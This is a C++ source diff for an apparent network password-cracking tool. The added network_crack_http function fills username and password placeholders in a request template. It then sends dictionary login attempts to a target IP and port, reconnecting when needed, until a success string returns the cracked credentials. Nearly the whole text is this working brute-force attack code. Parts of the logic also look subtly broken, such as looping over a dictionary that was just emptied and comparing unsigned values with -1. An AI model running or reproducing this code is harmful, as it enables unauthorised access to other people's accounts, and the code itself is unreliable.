@@ -4,10 +4,12 @@
 #include <malloc.h>
 #include <memory.h>
 
+#include <windows.h>
+
 #include "network_crack.h"
+#include "resolver_express.h"
 #include "resolver_string.h"
 #include "scan_tcp.h"
-
 
 crack_packet_raw network_crack_init(const string crack_packet,...) {
     crack_packet_raw result;
@@ -19,9 +21,10 @@ crack_packet_http network_crack_init(const http_packet& crack_packet,...) {
 }
 
 crack_index network_crack_online(const string target_ip,const unsigned int target_port,const crack_packet_raw& crack_packet,const string crack_term,bool first_recv) {
+    crack_index result;
     char* recv_buffer=(char*)malloc(NETWORK_CRACK_RECV_BUFFER_LENGTH);
 
-    if (NULL==recv_buffer) return -1;
+    if (NULL==recv_buffer) return result;
 
     memset(recv_buffer,0,NETWORK_CRACK_RECV_BUFFER_LENGTH);
     unsigned int tcp_handle=scan_tcp_connect(target_ip.c_str(),target_port);
@@ -46,12 +49,12 @@ crack_index network_crack_online(const string target_ip,const unsigned int targe
 
             if (-1!=recv_length) {
                 string recv_packet(recv_buffer);
-                if (find_string(recv_buffer,crack_term))
-                    return crack_loop;
+//                if (find_string(recv_buffer,crack_term))
+//                    return crack_loop;  WARNING! 
             }
         }
     }
-    return -1;
+    return result;
 }
 
 crack_index network_crack_online(const string target_ip,const unsigned int target_port,const crack_packet_http& crack_packet,const string crack_term,bool first_recv) {
@@ -64,32 +67,88 @@ crack_index network_crack_online(const string target_ip,const unsigned int targe
 }
 
 crack_index network_crack_telnet(const string target_ip,const unsigned int target_port,const dictionary& crack_dictionary) {
-    return false;
+    crack_index result;
+    return result;
 }
 
 crack_index network_crack_ssh(const string target_ip,const unsigned int target_port,const dictionary& crack_dictionary) {
+    crack_index result;
 //    network_crack_online
-    return false;
+    return result;
 }
 
-crack_index network_crack_http(const string target_ip,const unsigned int target_port,const dictionary& crack_dictionary,const string crack_express,const string crack_term) {
-    string express,resolve_string(crack_express);
+crack_index network_crack_http(const string target_ip,const unsigned int target_port,dictionary crack_dictionary,const string crack_express,const string crack_term) {
+    string resolve_string(crack_express);
     split_result split;
-    
-    while (-1!=find_string(resolve_string,"%username%") || -1!=find_string(resolve_string,"%password%")) {
-        split=split_string(resolve_string,"%");
-        express+=split.first;
-        express+="%string%,";
-        split=split_string(split.second,",");
-        left_move_string(split.second,1);
-        resolve_string=split.second;
-    }
-    if (!express.empty()) {
-        express=express.substr(0,express.length()-1);
-        express+=";";
-        resolve_string=express;
+    crack_index result;
 
+    unsigned int username_point=find_string(resolve_string,"%username%");
+    if (-1!=username_point) {
+        split=split_string(resolve_string,"%username%");
+        resolve_string=split.first;
+        left_move_string(split.second,10);
+        resolve_string+=split.second;
+    } else {
+        dictionary crack_dictionary_;
+        resolve_dictionary_add_username(crack_dictionary_,"");
+        resolve_dictionary_add_password(crack_dictionary_,
+            resolve_dictionary_get_password_list(crack_dictionary,
+                resolve_dictionary_get_user_list(crack_dictionary)[0]));
+        crack_dictionary=crack_dictionary_;
+    }
+    unsigned int password_point=find_string(resolve_string,"%password%");
+    if (-1!=password_point) {
+        split=split_string(resolve_string,"%password%");
+        resolve_string=split.first;
+        left_move_string(split.second,10);
+        resolve_string+=split.second;
+    } else {
+        dictionary crack_dictionary_;
+        username_list name_list;
+        name_list=resolve_dictionary_get_user_list(crack_dictionary);
+        crack_dictionary=crack_dictionary_;
+        for (dictionary::const_iterator username_iterator=crack_dictionary.begin();
+                                        username_iterator!=crack_dictionary.end();
+                                        ++username_iterator)
+            resolve_dictionary_add_username(crack_dictionary,username_iterator->first);
+        resolve_dictionary_add_password(crack_dictionary,"");
     }
 
-    return false;
+    unsigned int handle=scan_tcp_connect(target_ip.c_str(),target_port);
+    if (-1!=handle) {
+        for (dictionary::const_iterator username_iterator=crack_dictionary.begin();
+                                        username_iterator!=crack_dictionary.end();
+                                        ++username_iterator) {
+            for (password_list::const_iterator password_iterator=username_iterator->second.begin();
+                                               password_iterator!=username_iterator->second.end();
+                                               ++password_iterator) {
+                string packet(resolve_string);
+                if (-1!=username_point)
+                    packet.insert(username_point,username_iterator->first);
+                if (-1!=password_point)
+                    packet.insert(password_point+username_iterator->first.length(),*password_iterator);
+                packet=resolve_express(packet);
+CRACK:
+                char recv_buffer[NETWORK_CRACK_RECV_BUFFER_LENGTH]={0};
+                scan_tcp_send(handle,packet.c_str(),packet.length());
+                unsigned int recv_length=scan_tcp_recv(handle,recv_buffer,NETWORK_CRACK_RECV_BUFFER_LENGTH);
+                if (-1!=recv_length) {
+                    if (-1!=find_string(recv_buffer,crack_term)) {
+                        result.first=username_iterator->first;
+                        result.second=*password_iterator;
+                        scan_tcp_disconnect(handle);
+                        return result;
+                    }
+                } else {
+                    scan_tcp_disconnect(handle);
+                    Sleep(50);
+                    handle=scan_tcp_connect(target_ip.c_str(),target_port);
+                    Sleep(50);
+                    goto CRACK;
+                }
+            }
+        }
+        scan_tcp_disconnect(handle);
+    }
+    return result;
 }
